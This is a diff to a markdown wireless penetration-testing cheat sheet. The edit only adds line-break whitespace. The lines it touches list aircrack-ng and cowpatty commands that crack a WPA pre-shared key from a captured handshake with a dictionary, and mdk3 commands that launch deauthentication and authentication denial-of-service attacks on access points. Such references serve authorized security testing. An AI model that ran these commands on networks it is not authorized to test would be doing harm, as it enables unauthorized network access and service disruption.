@@ -428,9 +428,9 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 
 ##### Cracking WPA PSK
 
-* Crack with dictionary
-`aircrack-ng -a 2 -e [Name of AP] -b [MAC of AP] -w [dictionary] [4-way handshake PCAP]` (seems fast and reliable)
-`cowpatty -f [dictionary] -r [4-way handshake PCAP] -s [Name of AP]`
+* Crack with dictionary  
+`aircrack-ng -a 2 -e [Name of AP] -b [MAC of AP] -w [dictionary] [4-way handshake PCAP]` (seems fast and reliable)  
+`cowpatty -f [dictionary] -r [4-way handshake PCAP] -s [Name of AP]`  
 `cowpatty -2 -f [dictionary] -r [4-way handshake PCAP] -s [Name of AP]` (uses first 2 EAPOL packets)
 
 #### DoS
@@ -442,7 +442,7 @@ Visit http://linux-wless.passys.nl to check native Linux support for wireless ch
 
 ##### MDK3 DoS
 
-`mdk3 [interface] d` (deauth everyone, slow when there are many connections)
-`mdk3 [interface] d -b [blacklist w/ AP MACs] -c [channel]` (deauth networks listed in blacklist)
+`mdk3 [interface] d` (deauth everyone, slow when there are many connections)  
+`mdk3 [interface] d -b [blacklist w/ AP MACs] -c [channel]` (deauth networks listed in blacklist)  
 `mdk3 [interface] a -i [MAC of AP]` (authentication dos a certain AP)
 
